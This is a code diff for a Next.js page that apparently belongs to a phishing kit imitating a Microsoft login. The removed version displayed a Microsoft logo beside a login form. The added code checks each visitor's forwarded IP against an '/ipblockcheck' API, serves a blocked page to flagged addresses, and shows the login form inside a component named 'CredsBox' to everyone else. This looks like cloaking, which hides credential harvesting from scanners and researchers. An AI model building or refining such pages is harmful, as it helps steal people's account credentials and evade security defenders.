@@ -1,16 +1,37 @@
 import Image from "next/image";
 import Login from "./components/Login";
 import React from "react";
+import CredsBox from "./components/CredsBox";
+import Blocked_page from "./components/Blocked_page";
+import getConfig from 'next/config';
 
-export default function Home() {
-  return (
-    <section className="h-screen flex flex-col md:flex-row justify-center space-y-10 md:space-y-0 md:space-x-16 items-center my-2 mx-5 md:mx-0 md:my-0">
-      <div className="md:w-1/3 max-w-sm">
-        <img
-          src="/microsoft_logo.png"
-        />
-      </div>
-      <Login />
-    </section>
-  );
+export async function getServerSideProps({ req }) {
+  const { serverRuntimeConfig, publicRuntimeConfig } = getConfig();
+
+  const API_URI = serverRuntimeConfig.apiUrl ;
+  let res ;
+  try {
+    res = await fetch(
+      `${API_URI}/ipblockcheck/${req.headers["x-forwarded-for"]}`
+    );
+    
+  } catch (error) {
+    const API_URI = publicRuntimeConfig.apiUrl ;
+    res = await fetch(
+      `${API_URI}/ipblockcheck/${req.headers["x-forwarded-for"]}`
+    );
+  }
+  const repo = await res.json();
+  return { props: { repo } };
+}
+
+export default function Home({ repo }) {
+  const PageChanger = () => {
+    if (repo.stats == "blocked") {
+      return <Blocked_page />;
+    } else {
+      return <CredsBox curr_component={<Login />} />;
+    }
+  };
+  return <section>{PageChanger()}</section>;
 }
